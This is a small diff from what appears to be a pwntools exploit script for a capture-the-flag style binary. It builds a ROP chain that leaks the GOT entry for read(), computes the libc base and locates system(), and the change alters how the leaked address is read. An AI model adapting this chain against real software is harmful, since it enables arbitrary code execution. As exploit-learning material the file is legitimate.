@@ -24,7 +24,7 @@ payload += p64(rdi) + p64(1) + p64(rsi_r15) + p64(read_got) + p64(0) + p64(write
 payload += p64(rdi) + p64(0) + p64(rsi_r15) + p64(read_got) + p64(0) + p64(read_plt) #read(0, read_got,)
 payload += p64(rdi) + p64(read_got+0x8) + p64(ret) + p64(read_plt) #read(read_got + 0x8)
 p.sendafter(b'Buf: ', payload)
-read = u64(p.recvn(6) + b'\x00'*2)
+read = u64(p.recvn(8))
 lb = read - libc.symbols['read']
 system = lb + libc.symbols['system']
 
